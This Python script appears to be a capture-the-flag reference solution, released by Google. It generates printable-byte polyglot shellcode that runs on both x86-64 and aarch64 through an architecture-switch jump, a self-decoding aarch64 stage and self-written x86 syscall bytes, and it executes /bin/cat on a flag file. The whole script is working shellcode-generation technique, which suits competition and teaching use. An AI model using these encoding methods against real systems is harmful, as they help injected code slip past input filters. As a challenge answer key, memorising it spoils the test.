#!/usr/bin/env python3
# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# The general strategy of this payload is to write an alphanumeric decoder for
# each archetecture that writes a stage 2 payload that makes an
# execve("/bin/cat", {"/bin/cat", "flag", 0}) syscall.
#
# A byte sequence that is interpreted as a jump in x86 and a no-op arithmetic
# operation on aarch64 is used as a switch to transfer control flow to the
# appropriate portion of the payload depending on architecture.
#
# The layout of the final payload produced by this script is as follows:
#
#       [architecture switch #1]
#       [aarch64 prelude]
#       [aarch64 decoder]
#       [architecture switch #2]
#       [aarch64 decoder cont.]
#       [aarch64 instruction cache fence]
#       [encoded aarch64 stage 2]
#       [encoded "flag\0"]
#       [x86 payload]
#       ["/bin/cat"]
#
# - The architecture switch blocks use the following construction to create a
#   x86 forward jump of "offset" bytes and a no-op in aarch64:
#
#        bytes([0x75, offset + 2, 0x41, 0x71])
#
#   The offset value is signed which limits the range to 127 bytes. The aarch64
#   portion of the payload is larger than this value so a series of jumps are
#   chained together to jump over the entire aarch64 payload.
#
# - The aarch64 prelude initializes registers that are used by the decoder. As
#   a space saving optimization this takes advantage of leftover register state
#   from the host application.
#
# - The aarch64 decoder and encoded aarch64 stage 2 are constructed together.
#   The stage 2 payload is written without byte value restrictions and then
#   encoded by replacing illegal byte values with an 'A'.
#
#   Each replaced illegal byte corresponds to a sequence of instructions in the
#   decoder which seeks a cursor register forward to the placeholder byte value
#   and a sequence of instructions which write the intended byte value.
#
#   The encoded payload is constructed to minimize the number of illegal byte
#   values that need to be replaced.
#
#   Between the decoder section of the payload and the stage 2 payload is a
#   conditional branch instruction that is not taken. Without this the
#   instruction cache will contain the contents of the encoded stage 2 before
#   the placeholder bytes have been replaced.
#
# - The "flag\0" string that is used in the stage 2 aarch64 payload is included
#   at the end of the stage 2 payload and has its trailing null byte restored as
#   part of decoding the stage 2 payload.
#
# - The x86 payload is more straight forward. The registers are prepared for the
#   execve syscall in an alphanumeric manner and then a syscall instruction is
#   written to memory after the final x86 instruction. The x86 payload does not
#   re-use the "flag" and "/bin/cat" bytes used by the aarch64 payload. Instead
#   these strings are built on the stack by pushes.
#
# - The "/bin/cat" string for the aarch64 payload is included at the end of the
#   overall payload so that it is null-terminated for free.


import os
import pwn
import sys

def numInvalidBytes(data):
    """
    Returns the number of invalid bytes in a byte string.
    """
    count = 0
    for b in data:
        if b < 0x20 or 0x80 <= b:
            count += 1
    return count

def gen_payload(dummy_payload=None):
    """
    Generates a payload that prints the contents of the 'flag' file when
    executed on x86-64 and aarch64.

    The dummy_payload argument is the result of a previous call to this method.
    This is used as a heuristic to determine the length of the payload and used
    to calculate jump and data offsets.

    If the return value has the same length as the dummy_payload then the
    returned value is a valid payload. If they are not the same length, then the
    returned value should be passed to another call to gen_payload.
    """
    size = 0 if dummy_payload is None else len(dummy_payload)
    flag_offset = 0 if dummy_payload is None else dummy_payload.find(b"flagA")
    cat_offset = 0 if dummy_payload is None else dummy_payload.find(b"/bin/cat")

    # Aarch64 payload
    pwn.context.clear(arch='aarch64')

    def get_stage_2():
        # Brute force a value that can be added to x1 and then subtracted from
        # it to produce memory locations for "flag/0" and "/bin/cat\0" that
        # results in the minimum number of invalid bytes that will need later
        # patching.
        x1 = 0xb00
        asm = None
        while asm is None or numInvalidBytes(asm) > 11:
            x1 += 4
            cat_value = x1 - cat_offset
            flag_value = x1 - flag_offset
            asm = pwn.asm("""
            // x1 contains the shell code location. Use this to get offsets to
            // "/bin/cat" and "flag" embedded in the shell code.
            add x1, x1, #%d
            sub x0, x1, #%d
            sub x9, x1, #%d
            // Re-use x1 as the argument array pointer by writing the address of the
            // command and flag values to it.
            stp x0, x9, [x1]
            svc #0
            """ % (x1, cat_value, flag_value)) + b"flag\0"
        return asm

    def get_decoder(stage_2):
        decoder = b""
        encoded = b""
        offset = 0
        # Decoding works by having a current write value that is adjusted to the
        # intended value and then written to the cursor. This write value is
        # stored in w10.
        write_value = 0
        encoded_values = 0
        skip_next = False
        first = True
        first_offset = 0
        for i in range(0, len(stage_2)):
            if skip_next:
                skip_next = False
                continue

            value = stage_2[i]
            if 0x20 <= value < 0x80:
                encoded += bytes([value])
                offset += 1
            else:
                encoded_values += 1
                encoded += b'A'
                # Seek the offset register (w11) forward from the last value to
                # point to the new byte that needs to be fixed up.
                if not first:
                    if offset == 1:
                        decoder += pwn.asm("adds w11, w11, w4, lsr #9")
                    elif offset == 2:
                        decoder += pwn.asm("adds w11, w11, w6, lsr #9")
                    elif offset == 3:
                        decoder += pwn.asm("adds w11, w11, w4, lsr #8")
                    elif offset == 4:
                        decoder += pwn.asm("adds w11, w11, w6, lsr #8")
                    elif offset > 0:
                        print('extra long seek: %d' % offset)
                        decoder += pwn.asm("""
                        adds w11, w11, #%d
                        subs w11, w11, #%d
                        """ % (0xccc + offset, 0xccc))
                else:
                    first_offset = offset
                offset = 1

                # Special case writing the 0 byte since it is common.
                if value == 0:
                    # Special case for writing 2 null bytes in a row.
                    if i + 1 < len(stage_2) and stage_2[i + 1] == 0:
                        skip_next = True
                        offset = 2
                        encoded += b'A'
                        decoder += pwn.asm("strh w13, [x1, w11, uxtw]")
                    else:
                        decoder += pwn.asm("strb w13, [x1, w11, uxtw]")
                elif value == write_value & 0xFF:
                    decoder += pwn.asm("strb w10, [x1, w11, uxtw]")
                else:
                    # Brute force a sequence that does not result in any invalid
                    # bytes.
                    jiggle = 0
                    while True:
                        if jiggle == 0:
                            w10_update = pwn.asm("""
                            adds w10, w10, #%d
                            strb w10, [x1, w11, uxtw]
                            """ % (0xd00 - (write_value & 0xFF) + value))
                            write_value_diff = 0xd00 - (write_value & 0xFF) + value
                        else:
                            w10_update = pwn.asm("""
                            adds w10, w10, #%d
                            adds w10, w10, #%d
                            adds w10, w10, #%d
                            strb w10, [x1, w11, uxtw]
                            """ % (
                                0xd00 - ((2 * jiggle + write_value) & 0xFF) + value,
                                0xd00 + jiggle,
                                0xd00 + jiggle))
                            write_value_diff = 3 * 0xd00 - (write_value & 0xFF) + value
                        if numInvalidBytes(w10_update) == 0:
                            write_value += write_value_diff
                            decoder += w10_update
                            break
                        jiggle += 1

                first = False

        # Place a branch instruction after the decoding routine, this is
        # necessary to prevent the modified instructions from being prefetched
        # into the instruction cache.
        decoder += bytes([0x20, 0x20, 0x20, 0x54])

        print('encoded values: %d' % encoded_values)
        print('decoder invalid: %d' % numInvalidBytes(decoder))
        return (decoder, encoded, first_offset)

    aarch64_stage_2 = get_stage_2()
    (aarch64_decode, aarch64_stage_2_encoded, first_offset) = get_decoder(aarch64_stage_2)

    # Brute force a jiggle value that allows a sequence of add/sub instructions
    # to result in valid bytes.
    magic = 0xb00
    while True:
        # Decompose the offset into two smaller components. When this offset
        # gets large it may not be possible to fine a 2 instruction sequence
        # that encodes as valid bytes.
        offset_to_encoded = (14*4) + len(aarch64_decode) + first_offset
        a = int(offset_to_encoded / 2)
        b = offset_to_encoded - a
        aarch64_setup = pwn.asm("""
        // The strategy here is to write aarch64 shellcode directly and replace
        // non-alphanumeric values with dummy values and then patch the bytes in an
        // alphanumeric way.
        //
        // Assumptions:
        //   - x1, x0 point to shell code
        //   - w2 contains 0x1000
        //   - w10 is 0

        // w6 and w4 are used by the decoder to advance the cursor a small
        // number of bytes forward at a time. These two register values allow
        // the decoder to advance 1, 2, 3, or 4 bytes with a single instruction:
        //
        //   adds w11, w11, w4, lsr #9 // w11 += 1
        //   adds w11, w11, w6, lsr #9 // w11 += 2
        //   adds w11, w11, w4, lsr #8 // w11 += 3
        //   adds w11, w11, w6, lsr #8 // w11 += 4
        //
        // Set w6 to 1024, (b100_00000000)
        // Set w4 to 1024, (b11_00000000)
        subs w6, w2, #0xb0f
        subs w4, w2, #0xc0f

        // Clear w2 by loading a byte from the shell code and then anding it
        // with value with 0 LSB.
        ldurb w2, [x1, #2]
        // ands w2, w2, #0xff8000
        // Given in bytes since pwn.asm generates this in another format.
        """) + bytes([0x42, 0x20, 0x31, 0x72]) + pwn.asm("""

        // Setup x8 for the execve syscall (0xdd). Horribly inefficient but we
        // have the space...
        adds w9, w2, #0xccc
        subs w9, w9, #0xc5e
        adds w9, w9, #0xccc
        subs w8, w9, #0xc5d

        // Update w11 to the offset to the start of the stage 2 payload. Each
        // pair contains the intended offset plus a magic jiggle that is then
        // subtracted from it to get bytes to come out valid.
        adds w11, w2, #%d
        subs w11, w11, #%d
        adds w11, w11, #%d
        subs w11, w11, #%d
        """ % (magic + a, magic, magic + b, magic))
        magic += 1
        if numInvalidBytes(aarch64_setup) == 0:
            break

    aarch64_payload = aarch64_setup + aarch64_decode + aarch64_stage_2_encoded

    # x86-64 payload
    pwn.context.clear(arch='amd64')
    amd64_payload = pwn.asm("""
    // Set rbx to 0.
    push rax
    pop rbx

    // Adjust rcx to point to the next instruction after this block.
    push rdx
    pop rax
    // Delicate instructions to set a largish value into al that corresponds to
    // the size of the entire encoded shell code, works for size < 256:
    //  sub al, 0x30
    //  xor al, %%d
    // Works for larger sizes:
    xor ax, %d
    xor ax, %d
    push rax
    pop rcx

    // Store the encoding of 'syscall' in rbp.
    push rbx
    pop rax
    xor ax, 0x252f
    xor ax, 0x2020
    push rax
    pop rbp

    // Clear eax.
    push rbx
    pop rax
    push rax

    // Push "/bin/cat" and save in rdi.
    pushw 0x7461
    pushw 0x632f
    pushw 0x6e69
    pushw 0x622f
    push rsp
    pop rdi

    // push "flag" and save in rdx.
    push rax
    pushw 0x6761
    pushw 0x6c66
    push rsp
    pop rdx

    // Save ["/bin/cat", "flag", 0] in rdi.
    push rax
    push rdx
    push rdi
    push rsp
    pop rsi

    // Null rdx.
    push rax
    pop rdx

    // Set AL to the execve syscall number.
    xor al, 0x3b

    // Write a syscall opcode at the "next" instruction.
    push rcx
    pop rsp
    push rbp
    """ % (0x2028 ^ size, 0x2028))

    print('arm len: %d, invalid: %d' % (
        len(aarch64_payload), numInvalidBytes(aarch64_payload)))
    print('x86 len: %d, invalid: %d' % (
        len(amd64_payload), numInvalidBytes(amd64_payload)))

    # Byte offset into the ARM64 payload that contains a second jump instruction
    # that jumps to the x86 code. This allows x86 to jump over ARM code that is
    # longer than 127 bytes.
    #
    # This value needs to be large enough that it provides enough of a margin
    # that a second jump can reach the x86 shell code but small enough that the
    # jump is not inserted into the encoded second stage payload of the arm
    # shell code.
    #
    # This value must be a multiple of 4 so that it the jump instruction is
    # inserted between arm instructions.
    second_x86_jump_offset = 0x60

    def x86jmp(offset):
        # Returns an x86 instruction that will jump forward offset bytes and
        # when executed on arm is a no-op.
        return bytes([0x75, offset + 2, 0x41, 0x71])

    return (
        x86jmp(second_x86_jump_offset) +
        aarch64_payload[:second_x86_jump_offset] +
        x86jmp(len(aarch64_payload) - second_x86_jump_offset) +
        aarch64_payload[second_x86_jump_offset:] +
        amd64_payload +
        # To save space in the amd64 encoded section, /bin/cat is placed at the
        # end of the payload so that it is null terminated implicitly when the
        # payload is copied.
        b"/bin/cat"
    )

old_payload = b""
payload = gen_payload()
while len(old_payload) != len(payload):
    print()
    old_payload = payload
    payload = gen_payload(old_payload)

print("Payload = %s" % payload)
print("Total Length = %d" % len(payload))
print("Total Invalid = %d" % numInvalidBytes(payload))

with open("sol.txt", "wb") as f:
    f.write(payload)
